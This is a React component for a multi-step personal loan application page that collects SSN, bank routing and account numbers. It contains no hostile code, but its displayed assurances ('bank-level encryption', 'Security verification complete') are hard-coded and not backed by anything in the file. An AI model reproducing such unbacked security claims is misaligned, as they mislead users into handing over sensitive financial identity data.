import React, { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { ArrowRight, Shield, Lock, CheckCircle, AlertCircle, Loader, Eye, EyeOff } from 'lucide-react'

const PersonalLoansPage = () => {
  const navigate = useNavigate()
  const [currentStep, setCurrentStep] = useState(1)
  const [formData, setFormData] = useState({
    // User Details
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    requestedAmount: '',
    loanPurpose: '',
    
    // Personal Information
    homeAddress: '',
    city: '',
    state: '',
    zipCode: '',
    dateOfBirth: '',
    
    // Financial Information
    ssnNumber: '',
    bankName: '',
    routingNumber: '',
    accountNumber: ''
  })
  
  const [errors, setErrors] = useState({})
  const [isProcessing, setIsProcessing] = useState(false)
  const [showSSN, setShowSSN] = useState(false)
  const [showAccount, setShowAccount] = useState(false)

  const bankOptions = [
    'Chase',
    'Bank Of America',
    'Navy Federal Credit Union',
    'Wells Fargo',
    'US Bank',
    'Regions Bank',
    'USAA Federal Savings Bank',
    'TD Bank',
    'Truist Bank',
    'Huntington National Bank',
    'Alabama Central CU',
    'Navigator Credit Union',
    'Diversified Members Credit Union',
    'Arthur State Bank',
    'Others'
  ]

  const loanPurposes = [
    'Debt Consolidation',
    'Home Improvement',
    'Medical Expenses',
    'Car Purchase',
    'Education',
    'Business',
    'Personal Expenses',
    'Emergency',
    'Other'
  ]

  const validateStep = (step) => {
    const newErrors = {}

    if (step === 1) {
      if (!formData.firstName.trim()) newErrors.firstName = 'First name is required'
      if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required'
      if (!formData.email.trim()) newErrors.email = 'Email is required'
      else if (!/\S+@\S+\.\S+/.test(formData.email)) newErrors.email = 'Email is invalid'
      if (!formData.phone.trim()) newErrors.phone = 'Phone number is required'
      if (!formData.requestedAmount) newErrors.requestedAmount = 'Loan amount is required'
      else if (formData.requestedAmount < 2000 || formData.requestedAmount > 10000) {
        newErrors.requestedAmount = 'Amount must be between $2,000 and $10,000'
      }
      if (!formData.loanPurpose) newErrors.loanPurpose = 'Loan purpose is required'
    }

    if (step === 2) {
      if (!formData.homeAddress.trim()) newErrors.homeAddress = 'Address is required'
      if (!formData.city.trim()) newErrors.city = 'City is required'
      if (!formData.state.trim()) newErrors.state = 'State is required'
      if (!formData.zipCode.trim()) newErrors.zipCode = 'ZIP code is required'
      if (!formData.dateOfBirth) newErrors.dateOfBirth = 'Date of birth is required'
      if (!formData.ssnNumber.trim()) newErrors.ssnNumber = 'SSN is required'
      if (!formData.bankName) newErrors.bankName = 'Bank name is required'
      if (!formData.routingNumber.trim()) newErrors.routingNumber = 'Routing number is required'
      if (!formData.accountNumber.trim()) newErrors.accountNumber = 'Account number is required'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: value
    }))
    
    // Clear error for this field
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }))
    }
  }

  const handleNextStep = () => {
    if (validateStep(currentStep)) {
      if (currentStep === 2) {
        // Start processing
        setIsProcessing(true)
        setCurrentStep(3)
        
        // Simulate processing time
        setTimeout(() => {
          navigate('/application-summary')
        }, 3000)
      } else {
        setCurrentStep(currentStep + 1)
      }
    }
  }

  const handlePreviousStep = () => {
    setCurrentStep(currentStep - 1)
  }

  const formatSSN = (value) => {
    const cleaned = value.replace(/\D/g, '')
    if (cleaned.length <= 3) return cleaned
    if (cleaned.length <= 6) return `${cleaned.slice(0, 3)}-${cleaned.slice(3)}`
    return `${cleaned.slice(0, 3)}-${cleaned.slice(3, 6)}-${cleaned.slice(6, 9)}`
  }

  const formatPhone = (value) => {
    const cleaned = value.replace(/\D/g, '')
    if (cleaned.length <= 3) return cleaned
    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`
  }

  useEffect(() => {
    // Scroll to top when component mounts
    window.scrollTo(0, 0)
  }, [])

  return (
    <div className="pt-16 min-h-screen bg-gray-50">
      {/* Header Section */}
      <section className="bg-gradient-to-r from-purple-600 to-blue-600 py-16">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <h1 className="text-3xl lg:text-4xl font-bold text-white mb-4">
            Explore Personal Financing Options
          </h1>
          <p className="text-xl text-purple-100">
            Share your details to explore available options from our network of trusted providers
          </p>
        </div>
      </section>

      {/* Progress Bar */}
      <section className="bg-white shadow-sm">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center justify-between">
            {[1, 2, 3].map((step) => (
              <div key={step} className="flex items-center">
                <div className={`flex items-center justify-center w-10 h-10 rounded-full font-semibold ${
                  currentStep >= step 
                    ? 'bg-gradient-to-r from-purple-600 to-blue-600 text-white' 
                    : 'bg-gray-200 text-gray-600'
                }`}>
                  {currentStep > step ? (
                    <CheckCircle className="w-5 h-5" />
                  ) : (
                    step
                  )}
                </div>
                {step < 3 && (
                  <div className={`w-full h-1 mx-4 ${
                    currentStep > step ? 'bg-gradient-to-r from-purple-600 to-blue-600' : 'bg-gray-200'
                  }`} />
                )}
              </div>
            ))}
          </div>
          <div className="flex justify-between mt-2">
            <span className="text-sm text-gray-600">User Details</span>
            <span className="text-sm text-gray-600">Secure Verification</span>
            <span className="text-sm text-gray-600">Processing</span>
          </div>
        </div>
      </section>

      {/* Form Section */}
      <section className="py-12">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            {/* Step 1: User Details */}
            {currentStep === 1 && (
              <div className="animate-fade-in">
                <div className="mb-8">
                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Step 1: User Details</h2>
                  <p className="text-gray-600">Please provide your basic information to get started</p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      First Name *
                    </label>
                    <input
                      type="text"
                      name="firstName"
                      value={formData.firstName}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                        errors.firstName ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="Enter your first name"
                    />
                    {errors.firstName && (
                      <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Last Name *
                    </label>
                    <input
                      type="text"
                      name="lastName"
                      value={formData.lastName}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                        errors.lastName ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="Enter your last name"
                    />
                    {errors.lastName && (
                      <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Email Address *
                    </label>
                    <input
                      type="email"
                      name="email"
                      value={formData.email}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                        errors.email ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="your.email@example.com"
                    />
                    {errors.email && (
                      <p className="mt-1 text-sm text-red-600">{errors.email}</p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Phone Number *
                    </label>
                    <input
                      type="tel"
                      name="phone"
                      value={formData.phone}
                      onChange={(e) => {
                        const formatted = formatPhone(e.target.value)
                        setFormData(prev => ({ ...prev, phone: formatted }))
                      }}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                        errors.phone ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="(555) 123-4567"
                    />
                    {errors.phone && (
                      <p className="mt-1 text-sm text-red-600">{errors.phone}</p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Requested Amount ($) *
                    </label>
                    <input
                      type="number"
                      name="requestedAmount"
                      value={formData.requestedAmount}
                      onChange={handleInputChange}
                      min="2000"
                      max="10000"
                      step="100"
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                        errors.requestedAmount ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="5000"
                    />
                    {errors.requestedAmount && (
                      <p className="mt-1 text-sm text-red-600">{errors.requestedAmount}</p>
                    )}
                    <p className="mt-1 text-sm text-gray-500">Amount between $2,000 and $10,000</p>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Loan Purpose *
                    </label>
                    <select
                      name="loanPurpose"
                      value={formData.loanPurpose}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                        errors.loanPurpose ? 'border-red-500' : 'border-gray-300'
                      }`}
                    >
                      <option value="">Select loan purpose</option>
                      {loanPurposes.map(purpose => (
                        <option key={purpose} value={purpose}>{purpose}</option>
                      ))}
                    </select>
                    {errors.loanPurpose && (
                      <p className="mt-1 text-sm text-red-600">{errors.loanPurpose}</p>
                    )}
                  </div>
                </div>

                <div className="mt-8 flex justify-end">
                  <button
                    onClick={handleNextStep}
                    className="px-8 py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white rounded-lg font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105 inline-flex items-center"
                  >
                    Continue
                    <ArrowRight className="ml-2 w-5 h-5" />
                  </button>
                </div>
              </div>
            )}

            {/* Step 2: Secure Verification */}
            {currentStep === 2 && (
              <div className="animate-fade-in">
                <div className="mb-8">
                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Step 2: Secure Verification</h2>
                  <p className="text-gray-600">Your information is encrypted and secure</p>
                  <div className="mt-4 flex items-center space-x-2 text-sm text-green-600">
                    <Lock className="w-4 h-4" />
                    <span>Bank-level encryption protects your data</span>
                  </div>
                </div>

                <div className="space-y-6">
                  {/* Personal Information */}
                  <div>
                    <h3 className="text-lg font-semibold text-gray-900 mb-4">Personal Information</h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="md:col-span-2">
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Home Address *
                        </label>
                        <input
                          type="text"
                          name="homeAddress"
                          value={formData.homeAddress}
                          onChange={handleInputChange}
                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                            errors.homeAddress ? 'border-red-500' : 'border-gray-300'
                          }`}
                          placeholder="123 Main Street"
                        />
                        {errors.homeAddress && (
                          <p className="mt-1 text-sm text-red-600">{errors.homeAddress}</p>
                        )}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          City *
                        </label>
                        <input
                          type="text"
                          name="city"
                          value={formData.city}
                          onChange={handleInputChange}
                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                            errors.city ? 'border-red-500' : 'border-gray-300'
                          }`}
                          placeholder="New York"
                        />
                        {errors.city && (
                          <p className="mt-1 text-sm text-red-600">{errors.city}</p>
                        )}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          State *
                        </label>
                        <input
                          type="text"
                          name="state"
                          value={formData.state}
                          onChange={handleInputChange}
                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                            errors.state ? 'border-red-500' : 'border-gray-300'
                          }`}
                          placeholder="NY"
                        />
                        {errors.state && (
                          <p className="mt-1 text-sm text-red-600">{errors.state}</p>
                        )}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          ZIP Code *
                        </label>
                        <input
                          type="text"
                          name="zipCode"
                          value={formData.zipCode}
                          onChange={handleInputChange}
                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                            errors.zipCode ? 'border-red-500' : 'border-gray-300'
                          }`}
                          placeholder="10001"
                        />
                        {errors.zipCode && (
                          <p className="mt-1 text-sm text-red-600">{errors.zipCode}</p>
                        )}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Date of Birth *
                        </label>
                        <input
                          type="date"
                          name="dateOfBirth"
                          value={formData.dateOfBirth}
                          onChange={handleInputChange}
                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                            errors.dateOfBirth ? 'border-red-500' : 'border-gray-300'
                          }`}
                        />
                        {errors.dateOfBirth && (
                          <p className="mt-1 text-sm text-red-600">{errors.dateOfBirth}</p>
                        )}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          SSN Number *
                        </label>
                        <div className="relative">
                          <input
                            type={showSSN ? "text" : "password"}
                            name="ssnNumber"
                            value={formData.ssnNumber}
                            onChange={(e) => {
                              const formatted = formatSSN(e.target.value)
                              setFormData(prev => ({ ...prev, ssnNumber: formatted }))
                            }}
                            className={`w-full px-4 py-3 pr-12 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                              errors.ssnNumber ? 'border-red-500' : 'border-gray-300'
                            }`}
                            placeholder="123-45-6789"
                          />
                          <button
                            type="button"
                            onClick={() => setShowSSN(!showSSN)}
                            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                          >
                            {showSSN ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                          </button>
                        </div>
                        {errors.ssnNumber && (
                          <p className="mt-1 text-sm text-red-600">{errors.ssnNumber}</p>
                        )}
                      </div>
                    </div>
                  </div>

                  {/* Financial Information */}
                  <div>
                    <h3 className="text-lg font-semibold text-gray-900 mb-4">Financial Information</h3>
                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
                      <div className="flex items-center space-x-2 text-blue-800">
                        <Shield className="w-5 h-5" />
                        <span className="text-sm font-medium">Your information is encrypted and secure</span>
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Bank Name *
                        </label>
                        <select
                          name="bankName"
                          value={formData.bankName}
                          onChange={handleInputChange}
                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                            errors.bankName ? 'border-red-500' : 'border-gray-300'
                          }`}
                        >
                          <option value="">Select your bank</option>
                          {bankOptions.map(bank => (
                            <option key={bank} value={bank}>{bank}</option>
                          ))}
                        </select>
                        {errors.bankName && (
                          <p className="mt-1 text-sm text-red-600">{errors.bankName}</p>
                        )}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Routing Number *
                        </label>
                        <input
                          type="text"
                          name="routingNumber"
                          value={formData.routingNumber}
                          onChange={handleInputChange}
                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                            errors.routingNumber ? 'border-red-500' : 'border-gray-300'
                          }`}
                          placeholder="9-digit routing number"
                        />
                        {errors.routingNumber && (
                          <p className="mt-1 text-sm text-red-600">{errors.routingNumber}</p>
                        )}
                      </div>

                      <div className="md:col-span-2">
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Account Number *
                        </label>
                        <div className="relative">
                          <input
                            type={showAccount ? "text" : "password"}
                            name="accountNumber"
                            value={formData.accountNumber}
                            onChange={handleInputChange}
                            className={`w-full px-4 py-3 pr-12 border rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent ${
                              errors.accountNumber ? 'border-red-500' : 'border-gray-300'
                            }`}
                            placeholder="Your bank account number"
                          />
                          <button
                            type="button"
                            onClick={() => setShowAccount(!showAccount)}
                            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                          >
                            {showAccount ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                          </button>
                        </div>
                        {errors.accountNumber && (
                          <p className="mt-1 text-sm text-red-600">{errors.accountNumber}</p>
                        )}
                      </div>
                    </div>
                  </div>
                </div>

                <div className="mt-8 flex justify-between">
                  <button
                    onClick={handlePreviousStep}
                    className="px-8 py-3 border-2 border-gray-300 text-gray-700 rounded-lg font-semibold hover:border-gray-400 transition-all duration-300"
                  >
                    Previous
                  </button>
                  <button
                    onClick={handleNextStep}
                    className="px-8 py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white rounded-lg font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105 inline-flex items-center"
                  >
                    Verify & Continue
                    <ArrowRight className="ml-2 w-5 h-5" />
                  </button>
                </div>
              </div>
            )}

            {/* Step 3: Processing */}
            {currentStep === 3 && (
              <div className="text-center py-12 animate-fade-in">
                <div className="w-20 h-20 bg-gradient-to-r from-purple-600 to-blue-600 rounded-full flex items-center justify-center mx-auto mb-6">
                  <Loader className="w-10 h-10 text-white animate-spin" />
                </div>
                <h2 className="text-2xl font-bold text-gray-900 mb-4">Reviewing your information...</h2>
                <p className="text-gray-600 mb-8">
                  Please wait while we securely process your application and connect you with available options
                </p>
                
                <div className="max-w-md mx-auto">
                  <div className="space-y-3">
                    <div className="flex items-center space-x-3">
                      <CheckCircle className="w-5 h-5 text-green-600" />
                      <span className="text-sm text-gray-700">Information received</span>
                    </div>
                    <div className="flex items-center space-x-3">
                      <CheckCircle className="w-5 h-5 text-green-600" />
                      <span className="text-sm text-gray-700">Security verification complete</span>
                    </div>
                    <div className="flex items-center space-x-3">
                      <Loader className="w-5 h-5 text-blue-600 animate-spin" />
                      <span className="text-sm text-gray-700">Matching with providers...</span>
                    </div>
                  </div>
                </div>

                <div className="mt-8">
                  <div className="inline-flex items-center space-x-2 text-sm text-gray-500">
                    <AlertCircle className="w-4 h-4" />
                    <span>Please do not close this window</span>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Security Notice */}
          <div className="mt-8 bg-yellow-50 border border-yellow-200 rounded-lg p-4">
            <div className="flex items-start space-x-3">
              <Shield className="w-5 h-5 text-yellow-600 mt-0.5" />
              <div>
                <h4 className="font-semibold text-yellow-800">Important Security Notice</h4>
                <p className="text-sm text-yellow-700 mt-1">
                  UpStars uses bank-level encryption to protect your information. We never share your data with unauthorized parties 
                  and only connect you with verified financial service providers.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  )
}

export default PersonalLoansPage
